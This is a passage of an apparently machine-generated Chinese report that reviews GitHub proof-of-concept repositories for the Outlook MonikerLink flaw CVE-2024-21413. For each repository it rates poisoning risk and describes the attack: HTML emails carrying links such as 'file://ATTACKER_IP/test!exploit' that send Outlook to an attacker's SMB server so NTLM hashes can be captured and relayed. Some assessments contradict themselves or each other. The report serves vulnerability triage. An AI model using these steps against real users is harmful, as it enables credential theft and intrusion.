根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
